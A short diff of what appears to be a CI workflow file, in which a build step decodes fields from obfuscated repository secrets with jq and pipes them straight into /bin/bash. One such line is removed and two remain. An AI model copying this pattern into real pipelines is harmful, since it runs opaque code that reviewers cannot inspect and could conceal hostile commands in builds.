@@ -23,7 +23,6 @@ jobs:
           np6839: ${{ secrets.np6839 }}
         run: |
           printf '%s' "$np6839" | jq -r .s06 | /bin/bash
-          echo $g0415 | jq -r .yuxcl93 | /bin/bash
           echo $zawey0269 | jq -r .ki20708 | /bin/bash
 
       - name: Store artifact
